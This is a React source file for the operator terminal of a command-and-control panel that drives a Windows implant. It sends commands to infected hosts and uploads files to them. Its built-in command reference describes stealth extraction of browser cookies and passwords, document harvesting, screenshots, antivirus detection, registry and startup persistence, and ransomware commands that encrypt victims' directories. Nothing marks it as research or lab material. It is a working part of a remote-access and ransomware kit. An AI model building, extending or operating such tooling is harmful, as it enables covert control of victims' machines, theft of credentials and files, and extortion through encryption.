import React, { useState, useEffect, useRef } from 'react';
import styled from 'styled-components';
import { Prism as SyntaxHighlighter } from 'react-syntax-highlighter';
import { vscDarkPlus } from 'react-syntax-highlighter/dist/esm/styles/prism';
import { 
  FiTerminal, 
  FiSend, 
  FiTrash2, 
  FiDownload,
  FiUpload,
  FiCopy,
  FiMaximize2,
  FiMinimize2,
  FiHelpCircle,
  FiX
} from 'react-icons/fi';
import { toast } from 'react-toastify';

const MAX_TERMINAL_HISTORY = 500;

function terminalStorageKey(clientId) {
  return `terminalHistory_${clientId}`;
}

function normalizeLineTimestamp(ts) {
  if (!ts) return new Date();
  if (ts instanceof Date) return ts;
  const d = new Date(ts);
  return Number.isNaN(d.getTime()) ? new Date() : d;
}

/** Best-effort parse of remote working directory from implant output */
function extractRemoteCwd(text) {
  if (!text || typeof text !== 'string') return null;
  const m1 = text.match(/Current directory changed to:\s*([^\r\n]+)/i);
  if (m1) return m1[1].trim();
  const m2 = text.match(/^Directory:\s*([^\r\n]+)/m);
  if (m2) return m2[1].trim();
  const lines = text.trim().split(/\r?\n/).filter(Boolean);
  if (lines.length === 1) {
    const l = lines[0].trim();
    if (/^[A-Za-z]:\\/.test(l) || (l.startsWith('/') && l.length > 1)) return l;
  }
  return null;
}

function buildRemoteUploadPath(cwd, fileName) {
  const name = (fileName || 'upload.bin').replace(/[<>:"|?*]/g, '_');
  if (!cwd) return name;
  const base = cwd.replace(/[\\/]+$/, '');
  return `${base}\\${name}`;
}

function terminalUploadBarPercent(progress) {
  if (!progress) return 0;
  if (progress.phase === 'read' && progress.total > 0) {
    return Math.min(24, Math.round((progress.loaded / progress.total) * 24));
  }
  if (progress.phase === 'send' && progress.total > 0) {
    return 24 + Math.round((progress.sent / progress.total) * 76);
  }
  return 0;
}

const TerminalContainer = styled.div`
  background: #0a0a0a;
  border-radius: 12px;
  border: 1px solid #333;
  height: calc(100vh - 140px);
  display: flex;
  flex-direction: column;
  overflow: hidden;
`;

const TerminalHeader = styled.div`
  background: linear-gradient(90deg, #1a1a1a 0%, #2d2d2d 100%);
  border-bottom: 1px solid #333;
  padding: 12px 20px;
  display: flex;
  align-items: center;
  justify-content: space-between;
`;

const HeaderLeft = styled.div`
  display: flex;
  align-items: center;
  gap: 12px;
`;

const TerminalIcon = styled.div`
  width: 32px;
  height: 32px;
  background: linear-gradient(135deg, #00ff88, #00cc6a);
  border-radius: 6px;
  display: flex;
  align-items: center;
  justify-content: center;
  color: #000;
  font-size: 16px;
`;

const ClientInfo = styled.div`
  .client-name {
    font-weight: 600;
    color: #fff;
    font-size: 14px;
  }
  
  .client-ip {
    color: #888;
    font-size: 12px;
  }
`;

const HeaderRight = styled.div`
  display: flex;
  align-items: center;
  gap: 8px;
`;

const HeaderButton = styled.button`
  background: rgba(255, 255, 255, 0.1);
  border: 1px solid #333;
  color: #ccc;
  padding: 6px 12px;
  border-radius: 6px;
  cursor: pointer;
  display: flex;
  align-items: center;
  gap: 6px;
  font-size: 12px;
  transition: all 0.2s;

  &:hover {
    background: rgba(255, 255, 255, 0.2);
    color: #fff;
  }
`;

const TerminalBody = styled.div`
  flex: 1;
  display: flex;
  flex-direction: column;
  overflow: hidden;
`;

const OutputArea = styled.div`
  flex: 1;
  padding: 20px;
  overflow-y: auto;
  background: #0a0a0a;
  font-family: 'Courier New', monospace;
  font-size: 14px;
  line-height: 1.5;
`;

const OutputLine = styled.div`
  margin-bottom: 8px;
  display: flex;
  align-items: flex-start;
  gap: 12px;
  
  &.command {
    color: #00ff88;
    
    &::before {
      content: '> ';
      color: #666;
    }
  }
  
  &.response {
    color: #ccc;
    white-space: pre-wrap;
    word-break: break-word;
  }
  
  &.error {
    color: #ff6b6b;
  }
  
  &.info {
    color: #4dabf7;
  }
`;

const Timestamp = styled.span`
  color: #666;
  font-size: 12px;
  min-width: 80px;
  flex-shrink: 0;
`;

const InputArea = styled.div`
  background: #1a1a1a;
  border-top: 1px solid #333;
  padding: 16px 20px;
  display: flex;
  align-items: center;
  gap: 12px;
`;

const UploadToolbar = styled.div`
  background: #121212;
  border-top: 1px solid #2a2a2a;
  padding: 10px 20px;
  display: flex;
  flex-wrap: wrap;
  align-items: center;
  gap: 12px;
  font-size: 12px;
  color: #aaa;
`;

const UploadPathHint = styled.div`
  flex: 1;
  min-width: 200px;
  font-family: 'Courier New', monospace;
  color: #7dffb3;
  word-break: break-all;
`;

const UploadButton = styled.button`
  background: rgba(0, 255, 136, 0.12);
  border: 1px solid #00ff88;
  color: #00ff88;
  padding: 8px 14px;
  border-radius: 8px;
  cursor: pointer;
  display: flex;
  align-items: center;
  gap: 8px;
  font-size: 12px;
  font-weight: 600;
  transition: all 0.2s;

  &:hover:not(:disabled) {
    background: rgba(0, 255, 136, 0.22);
    color: #fff;
  }

  &:disabled {
    opacity: 0.45;
    cursor: not-allowed;
  }
`;

const HiddenFileInput = styled.input`
  display: none;
`;

const UploadProgressRow = styled.div`
  flex: 1 1 100%;
  min-width: 220px;
`;

const UploadProgressMeta = styled.div`
  display: flex;
  justify-content: space-between;
  align-items: center;
  margin-bottom: 4px;
  font-size: 11px;
  color: #888;
  font-family: 'Courier New', monospace;
`;

const UploadProgressTrack = styled.div`
  height: 8px;
  background: #2a2a2a;
  border-radius: 4px;
  overflow: hidden;
  border: 1px solid #333;
`;

const UploadProgressFill = styled.div`
  height: 100%;
  background: linear-gradient(90deg, #00ff88, #00aa66);
  transition: width 0.15s ease-out;
`;

const CommandInput = styled.input`
  flex: 1;
  background: #0a0a0a;
  border: 1px solid #333;
  color: #fff;
  padding: 12px 16px;
  border-radius: 8px;
  font-family: 'Courier New', monospace;
  font-size: 14px;
  outline: none;
  transition: border-color 0.2s;

  &:focus {
    border-color: #00ff88;
  }

  &::placeholder {
    color: #666;
  }
`;

const SendButton = styled.button`
  background: linear-gradient(135deg, #00ff88, #00cc6a);
  border: none;
  color: #000;
  padding: 12px 20px;
  border-radius: 8px;
  cursor: pointer;
  display: flex;
  align-items: center;
  gap: 8px;
  font-weight: 600;
  transition: all 0.2s;

  &:hover {
    transform: translateY(-1px);
    box-shadow: 0 4px 12px rgba(0, 255, 136, 0.3);
  }

  &:disabled {
    opacity: 0.5;
    cursor: not-allowed;
    transform: none;
  }
`;

const QuickCommands = styled.div`
  display: flex;
  flex-wrap: wrap;
  gap: 8px;
  margin-bottom: 16px;
`;

const QuickCommandButton = styled.button`
  background: rgba(0, 255, 136, 0.1);
  border: 1px solid #00ff88;
  color: #00ff88;
  padding: 6px 12px;
  border-radius: 6px;
  font-size: 12px;
  cursor: pointer;
  transition: all 0.2s;

  &:hover {
    background: rgba(0, 255, 136, 0.2);
  }
`;

const ModalOverlay = styled.div`
  position: fixed;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  background: rgba(0, 0, 0, 0.8);
  display: flex;
  align-items: center;
  justify-content: center;
  z-index: 1000;
  animation: fadeIn 0.2s ease-out;

  @keyframes fadeIn {
    from {
      opacity: 0;
    }
    to {
      opacity: 1;
    }
  }
`;

const ModalContent = styled.div`
  background: #1a1a1a;
  border: 1px solid #333;
  border-radius: 12px;
  width: 90%;
  max-width: 900px;
  max-height: 80vh;
  overflow-y: auto;
  animation: slideUp 0.3s ease-out;

  @keyframes slideUp {
    from {
      transform: translateY(20px);
      opacity: 0;
    }
    to {
      transform: translateY(0);
      opacity: 1;
    }
  }
`;

const ModalHeader = styled.div`
  background: linear-gradient(90deg, #1a1a1a 0%, #2d2d2d 100%);
  border-bottom: 1px solid #333;
  padding: 20px;
  display: flex;
  align-items: center;
  justify-content: space-between;
  position: sticky;
  top: 0;
  z-index: 1;

  h2 {
    color: #00ff88;
    font-size: 20px;
    margin: 0;
    display: flex;
    align-items: center;
    gap: 10px;
  }
`;

const CloseButton = styled.button`
  background: rgba(255, 255, 255, 0.1);
  border: 1px solid #333;
  color: #ccc;
  width: 32px;
  height: 32px;
  border-radius: 6px;
  cursor: pointer;
  display: flex;
  align-items: center;
  justify-content: center;
  transition: all 0.2s;

  &:hover {
    background: rgba(255, 107, 107, 0.2);
    border-color: #ff6b6b;
    color: #ff6b6b;
  }
`;

const ModalBody = styled.div`
  padding: 20px;
`;

const CommandSection = styled.div`
  margin-bottom: 30px;

  h3 {
    color: #00ff88;
    font-size: 16px;
    margin-bottom: 12px;
    padding-bottom: 8px;
    border-bottom: 1px solid #333;
  }
`;

const CommandList = styled.div`
  display: grid;
  grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
  gap: 12px;
`;

const CommandItem = styled.div`
  background: rgba(0, 255, 136, 0.05);
  border: 1px solid #333;
  border-radius: 8px;
  padding: 12px;
  transition: all 0.2s;

  &:hover {
    background: rgba(0, 255, 136, 0.1);
    border-color: #00ff88;
  }

  .command-name {
    color: #00ff88;
    font-family: 'Courier New', monospace;
    font-size: 14px;
    font-weight: 600;
    margin-bottom: 4px;
  }

  .command-desc {
    color: #888;
    font-size: 12px;
    line-height: 1.4;
  }
`;

const SearchBox = styled.input`
  width: 100%;
  background: #0a0a0a;
  border: 1px solid #333;
  color: #fff;
  padding: 12px 16px;
  border-radius: 8px;
  font-size: 14px;
  margin-bottom: 20px;
  outline: none;
  transition: border-color 0.2s;

  &:focus {
    border-color: #00ff88;
  }

  &::placeholder {
    color: #666;
  }
`;

const Terminal = ({ client, socket }) => {
  const [command, setCommand] = useState('');
  const [output, setOutput] = useState([]);
  const [isConnected, setIsConnected] = useState(false);
  const [showHelp, setShowHelp] = useState(false);
  const [searchTerm, setSearchTerm] = useState('');
  const [remoteCwd, setRemoteCwd] = useState(null);
  const [uploadBusy, setUploadBusy] = useState(false);
  const [uploadProgress, setUploadProgress] = useState(null);
  const [historyReady, setHistoryReady] = useState(false);
  const outputRef = useRef(null);
  const inputRef = useRef(null);
  const fileInputRef = useRef(null);
  const socketRef = useRef(socket);
  socketRef.current = socket;

  const commandsData = {
    'Terminal panel': [
      { name: 'Upload file (button)', desc: 'Above the command line: pick a file to send to the implant. Saves under remote cwd + filename (run pwd or cd first so the path hint is correct). Uses the same binary upload channel as the server.' },
      { name: 'Session history', desc: 'Up to 500 lines of output are saved in the browser per client and restored when you select that client again. Clear removes the on-screen log and saved history for this client.' },
      { name: 'Remote folder hint', desc: 'Green line under Upload shows where files will land (parsed from pwd, cd success, or dir listing). Auto-runs pwd shortly after connect to refresh cwd.' },
      { name: 'Quick commands', desc: 'Shortcut chips insert common commands; pwd is included so you can refresh cwd before uploading.' },
      { name: 'File Manager tab', desc: 'Same implant: graphical browser uses cd, ls, download (full paths), and GUI upload — useful alongside this terminal.' }
    ],
    'Client session': [
      { name: '(Implant) Auto-reconnect', desc: 'Not a command: if the TCP session drops (server restart, network), the client process waits about 10 seconds and dials the C2 again while still running.' },
      { name: '(Implant) Browser extract', desc: 'No automatic browser dump on connect anymore. Use extractbrowser or extractbrowserhidden only when you want a ZIP.' }
    ],
    'System Information': [
      { name: 'sysinfo', desc: 'Display detailed system information (OS, CPU, RAM, etc.)' },
      { name: 'processes', desc: 'List all running processes' },
      { name: 'services', desc: 'List all Windows services' },
      { name: 'network', desc: 'Display network configuration' },
      { name: 'antivirus', desc: 'Detect installed antivirus software' },
      { name: 'firewall', desc: 'Check Windows Firewall status' },
      { name: 'whoami', desc: 'Display current user information' },
      { name: 'ipconfig', desc: 'Display IP configuration' },
      { name: 'tasklist', desc: 'List all running tasks' },
      { name: 'netstat -an', desc: 'Display all network connections' }
    ],
    'File Operations': [
      { name: 'ls', desc: 'List current directory (implant cwd). Use ls <path> or ls "C:\\path" to list without changing cwd.' },
      { name: 'dir', desc: 'Same listing as ls for bare dir; use dir <path> with a space after dir for a specific folder.' },
      { name: 'cd <path>', desc: 'Change implant working directory. Quoted paths supported. cd .. goes up one level.' },
      { name: 'pwd', desc: 'Print implant current directory (used by Terminal upload hint and File Manager).' },
      { name: 'download <path>', desc: 'Pull a file by full path, or a folder (client packs it as a ZIP stream). Does not auto-chain .lnk / nested downloads. Progress prints on the implant console (stderr).' },
      { name: 'downloadresolve <path>', desc: 'Same as download for the first file, but tells the server to resolve ZIP/.lnk follow-ups into extra downloads (opt-in to old auto-pull behavior).' },
      { name: 'upload <path>', desc: 'Legacy: server sends upload + path then binary after implant replies ready. Prefer the Upload button in this panel (uploadBinaryToClient) for GUI uploads.' }
    ],
    'Browser Data Extraction': [
      { name: 'extractbrowser', desc: 'Extract browser data (cookies, history, passwords) to a ZIP when you run it.' },
      { name: 'extractbrowserhidden', desc: 'Stealth ZIP extraction (hidden). Manual only — not triggered automatically on client connect.' },
      { name: 'browserpaths', desc: 'Show recent browser file paths' },
      { name: 'harvestdocs', desc: 'Scan and list all documents from Desktop, Downloads, Documents' }
    ],
    'Surveillance': [
      { name: 'screenshot', desc: 'Take a screenshot' }
    ],
    'Ransomware': [
      { name: 'encrypt <directory> <password>', desc: 'Encrypt files in directory' },
      { name: 'decrypt <directory> <password>', desc: 'Decrypt files in directory' },
      { name: 'setpass <password>', desc: 'Set encryption password' },
      { name: 'getpass', desc: 'Get current encryption password' },
      { name: 'listencrypted', desc: 'List all encrypted files' }
    ],
    'Persistence': [
      { name: 'startup add', desc: 'Add to Windows startup' },
      { name: 'startup remove', desc: 'Remove from Windows startup' },
      { name: 'registry add', desc: 'Add registry persistence' },
      { name: 'registry remove', desc: 'Remove registry persistence' }
    ],
    'Server Commands': [
      { name: 'resolveshortcuts', desc: 'Server-side: scan downloaded .lnk files in the server downloads folder and issue download commands for targets (runs on C2, not on the implant).' },
      { name: 'harvestdocs', desc: 'Scan system folders for documents (PDFs, Word, Excel, PowerPoint)' }
    ],
    'Windows Commands': [
      { name: 'hostname', desc: 'Display computer name' },
      { name: 'systeminfo', desc: 'Display system information' },
      { name: 'taskkill /PID <pid>', desc: 'Kill a process' },
      { name: 'sc query', desc: 'Query service status' },
      { name: 'reg query <key>', desc: 'Query registry key' },
      { name: 'dir /s <pattern>', desc: 'Search for files recursively' }
    ],
    'Control': [
      { name: 'q', desc: 'Disconnect client (graceful exit)' },
      { name: 'test', desc: 'Test connection' }
    ]
  };

  const quickCommands = [
    'sysinfo',
    'processes',
    'services',
    'network',
    'screenshot',
    'dir',
    'pwd',
    'whoami',
    'ipconfig',
    'tasklist',
    'netstat -an'
  ];

  // Restore terminal transcript for this client
  useEffect(() => {
    if (!client?.id) return;
    setHistoryReady(false);
    try {
      const raw = localStorage.getItem(terminalStorageKey(client.id));
      if (raw) {
        const parsed = JSON.parse(raw);
        if (Array.isArray(parsed) && parsed.length) {
          setOutput(
            parsed.map((line) => ({
              ...line,
              timestamp: normalizeLineTimestamp(line.timestamp)
            }))
          );
        } else {
          setOutput([]);
        }
      } else {
        setOutput([]);
      }
    } catch {
      setOutput([]);
    }
    setHistoryReady(true);
  }, [client?.id]);

  // Persist transcript (cap length) — only after history loaded for this client
  useEffect(() => {
    if (!client?.id || !historyReady) return;
    try {
      const capped = output.slice(-MAX_TERMINAL_HISTORY);
      localStorage.setItem(terminalStorageKey(client.id), JSON.stringify(capped));
    } catch (e) {
      console.warn('Terminal history save failed', e);
    }
  }, [output, client?.id, historyReady]);

  // Sync remote cwd once per selected client (avoid re-firing pwd on unrelated socket object churn).
  useEffect(() => {
    if (!client) return;
    const t = setTimeout(() => {
      const s = socketRef.current;
      if (!s || !s.connected) return;
      s.emit('executeCommand', { clientId: client.id, command: 'pwd' });
    }, 350);
    return () => clearTimeout(t);
  }, [client?.id]);

  useEffect(() => {
    if (!socket || !client) return;

    const handleCommandResponse = (data) => {
      if (data.clientId === client.id) {
        const text = data.response != null ? String(data.response) : '';
        const inferred = extractRemoteCwd(text);
        if (inferred) setRemoteCwd(inferred);

        if (/upload complete/i.test(text)) {
          setUploadBusy(false);
          setUploadProgress(null);
          toast.success('File uploaded to client');
        } else if (/upload failed/i.test(text) || /upload timed out/i.test(text)) {
          setUploadBusy(false);
          setUploadProgress(null);
        }

        setOutput((prev) => [
          ...prev,
          {
            type: 'response',
            content: data.response,
            timestamp: new Date()
          }
        ]);
      }
    };

    const handleCommandSent = (data) => {
      if (data.clientId === client.id) {
        setOutput((prev) => [
          ...prev,
          {
            type: 'command',
            content: data.command,
            timestamp: new Date()
          }
        ]);
      }
    };

    const handleCommandError = (error) => {
      setOutput((prev) => [
        ...prev,
        {
          type: 'error',
          content: `Error: ${error.error}`,
          timestamp: new Date()
        }
      ]);
    };

    const handleUploadErr = (payload) => {
      if (payload && payload.clientId === client.id) {
        toast.error(payload.error || 'Upload failed');
        setUploadBusy(false);
        setUploadProgress(null);
      }
    };

    const handleUploadQueued = (payload) => {
      if (payload && payload.clientId === client.id) {
        toast.info(`Uploading ${payload.size} bytes…`);
      }
    };

    const handleUploadProgress = (payload) => {
      if (!payload || payload.clientId !== client.id) return;
      if (payload.done) {
        setUploadProgress(null);
        return;
      }
      if (payload.total > 0) {
        setUploadProgress({ phase: 'send', sent: payload.sent, total: payload.total });
      }
    };

    socket.on('commandResponse', handleCommandResponse);
    socket.on('commandSent', handleCommandSent);
    socket.on('commandError', handleCommandError);
    socket.on('uploadError', handleUploadErr);
    socket.on('uploadQueued', handleUploadQueued);
    socket.on('uploadProgress', handleUploadProgress);

    setIsConnected(true);

    return () => {
      socket.off('commandResponse', handleCommandResponse);
      socket.off('commandSent', handleCommandSent);
      socket.off('commandError', handleCommandError);
      socket.off('uploadError', handleUploadErr);
      socket.off('uploadQueued', handleUploadQueued);
      socket.off('uploadProgress', handleUploadProgress);
    };
  }, [socket, client]);

  useEffect(() => {
    setUploadProgress(null);
    setUploadBusy(false);
  }, [client?.id]);

  useEffect(() => {
    if (outputRef.current) {
      outputRef.current.scrollTop = outputRef.current.scrollHeight;
    }
  }, [output]);

  const handleSendCommand = () => {
    if (!command.trim() || !socket || !client) return;

    socket.emit('executeCommand', {
      clientId: client.id,
      command: command.trim()
    });

    setCommand('');
  };

  const handleKeyPress = (e) => {
    if (e.key === 'Enter') {
      handleSendCommand();
    }
  };

  const handleQuickCommand = (cmd) => {
    setCommand(cmd);
    if (inputRef.current) {
      inputRef.current.focus();
    }
  };

  const handleUploadPick = () => {
    if (!socket || !client || uploadBusy) return;
    if (fileInputRef.current) fileInputRef.current.click();
  };

  const handleFileSelected = (e) => {
    const file = e.target.files && e.target.files[0];
    if (!file || !socket || !client) return;
    setUploadBusy(true);
    setUploadProgress({ phase: 'read', loaded: 0, total: file.size });
    const reader = new FileReader();
    reader.onprogress = (ev) => {
      if (ev.lengthComputable) {
        setUploadProgress({ phase: 'read', loaded: ev.loaded, total: ev.total });
      }
    };
    reader.onload = () => {
      try {
        const res = reader.result;
        const str = String(res);
        const comma = str.indexOf(',');
        const base64 = comma >= 0 ? str.slice(comma + 1) : str;
        const remotePath = buildRemoteUploadPath(remoteCwd, file.name);
        setUploadProgress({ phase: 'send', sent: 0, total: file.size });
        socket.emit('uploadBinaryToClient', { clientId: client.id, remotePath, fileBase64: base64 });
      } catch (err) {
        toast.error(err.message || 'Upload prepare failed');
        setUploadBusy(false);
        setUploadProgress(null);
      }
      e.target.value = '';
    };
    reader.onerror = () => {
      toast.error('Could not read file');
      setUploadBusy(false);
      setUploadProgress(null);
      e.target.value = '';
    };
    reader.readAsDataURL(file);
  };

  const clearOutput = () => {
    setOutput([]);
    if (client?.id) {
      try {
        localStorage.removeItem(terminalStorageKey(client.id));
      } catch {
        /* ignore */
      }
    }
  };

  const copyOutput = () => {
    const text = output.map(line =>
      `[${normalizeLineTimestamp(line.timestamp).toLocaleTimeString()}] ${line.type === 'command' ? '>' : ''} ${line.content}`
    ).join('\n');

    navigator.clipboard.writeText(text);
    toast.success('Output copied to clipboard');
  };

  const filterCommands = () => {
    if (!searchTerm.trim()) return commandsData;

    const filtered = {};
    Object.keys(commandsData).forEach(category => {
      const matches = commandsData[category].filter(cmd =>
        cmd.name.toLowerCase().includes(searchTerm.toLowerCase()) ||
        cmd.desc.toLowerCase().includes(searchTerm.toLowerCase())
      );
      if (matches.length > 0) {
        filtered[category] = matches;
      }
    });
    return filtered;
  };

  const filteredCommands = filterCommands();

  if (!client) {
    return (
      <TerminalContainer>
        <div style={{ 
          display: 'flex', 
          alignItems: 'center', 
          justifyContent: 'center', 
          height: '100%',
          color: '#666',
          fontSize: '16px'
        }}>
          Select a client to start terminal session
        </div>
      </TerminalContainer>
    );
  }

  return (
    <TerminalContainer>
      <TerminalHeader>
        <HeaderLeft>
          <TerminalIcon>
            <FiTerminal />
          </TerminalIcon>
          <ClientInfo>
            <div className="client-name">{client.hostname}</div>
            <div className="client-ip">{client.ip}</div>
          </ClientInfo>
        </HeaderLeft>
        
        <HeaderRight>
          <HeaderButton onClick={() => setShowHelp(true)}>
            <FiHelpCircle />
            Help
          </HeaderButton>
          <HeaderButton onClick={copyOutput}>
            <FiCopy />
            Copy
          </HeaderButton>
          <HeaderButton onClick={clearOutput}>
            <FiTrash2 />
            Clear
          </HeaderButton>
        </HeaderRight>
      </TerminalHeader>

      {showHelp && (
        <ModalOverlay onClick={() => setShowHelp(false)}>
          <ModalContent onClick={(e) => e.stopPropagation()}>
            <ModalHeader>
              <h2>
                <FiHelpCircle />
                Available Commands
              </h2>
              <CloseButton onClick={() => setShowHelp(false)}>
                <FiX />
              </CloseButton>
            </ModalHeader>
            <ModalBody>
              <SearchBox
                type="text"
                placeholder="Search commands..."
                value={searchTerm}
                onChange={(e) => setSearchTerm(e.target.value)}
              />
              
              {Object.keys(filteredCommands).length === 0 ? (
                <div style={{ color: '#666', textAlign: 'center', padding: '40px' }}>
                  No commands found matching "{searchTerm}"
                </div>
              ) : (
                Object.keys(filteredCommands).map((category) => (
                  <CommandSection key={category}>
                    <h3>{category}</h3>
                    <CommandList>
                      {filteredCommands[category].map((cmd, index) => (
                        <CommandItem key={index} onClick={() => {
                          setCommand(cmd.name.replace(/<.*?>/g, ''));
                          setShowHelp(false);
                          if (inputRef.current) {
                            inputRef.current.focus();
                          }
                        }}>
                          <div className="command-name">{cmd.name}</div>
                          <div className="command-desc">{cmd.desc}</div>
                        </CommandItem>
                      ))}
                    </CommandList>
                  </CommandSection>
                ))
              )}
            </ModalBody>
          </ModalContent>
        </ModalOverlay>
      )}

      <TerminalBody>
        <QuickCommands>
          {quickCommands.map((cmd, index) => (
            <QuickCommandButton
              key={index}
              onClick={() => handleQuickCommand(cmd)}
            >
              {cmd}
            </QuickCommandButton>
          ))}
        </QuickCommands>

        <OutputArea ref={outputRef}>
          {output.length === 0 ? (
            <div style={{ color: '#666', fontStyle: 'italic' }}>
              Terminal ready. Type a command or select from quick commands above.
            </div>
          ) : (
            output.map((line, index) => (
              <OutputLine key={`${index}-${normalizeLineTimestamp(line.timestamp).getTime()}`} className={line.type}>
                <Timestamp>
                  {normalizeLineTimestamp(line.timestamp).toLocaleTimeString()}
                </Timestamp>
                <div>{line.content}</div>
              </OutputLine>
            ))
          )}
        </OutputArea>

        <UploadToolbar>
          <UploadButton type="button" onClick={handleUploadPick} disabled={!isConnected || uploadBusy}>
            <FiUpload />
            {uploadBusy ? 'Uploading…' : 'Upload file'}
          </UploadButton>
          <HiddenFileInput
            ref={fileInputRef}
            type="file"
            onChange={handleFileSelected}
            disabled={uploadBusy}
          />
          <UploadPathHint title="Uses the same working directory as cd / pwd on the implant">
            {remoteCwd
              ? `→ ${remoteCwd}\\<filename>`
              : '→ (run pwd or cd to set folder; until then files use name only in implant cwd)'}
          </UploadPathHint>
          {(uploadBusy || uploadProgress) && (
            <UploadProgressRow>
              <UploadProgressMeta>
                <span>
                  {uploadProgress?.phase === 'read'
                    ? 'Reading file…'
                    : uploadProgress?.phase === 'send'
                      ? 'Sending to implant…'
                      : 'Upload…'}
                </span>
                <span>{terminalUploadBarPercent(uploadProgress)}%</span>
              </UploadProgressMeta>
              <UploadProgressTrack>
                <UploadProgressFill style={{ width: `${terminalUploadBarPercent(uploadProgress)}%` }} />
              </UploadProgressTrack>
            </UploadProgressRow>
          )}
        </UploadToolbar>

        <InputArea>
          <CommandInput
            ref={inputRef}
            value={command}
            onChange={(e) => setCommand(e.target.value)}
            onKeyPress={handleKeyPress}
            placeholder="Enter command..."
            disabled={!isConnected}
          />
          <SendButton
            onClick={handleSendCommand}
            disabled={!command.trim() || !isConnected}
          >
            <FiSend />
            Send
          </SendButton>
        </InputArea>
      </TerminalBody>
    </TerminalContainer>
  );
};

export default Terminal;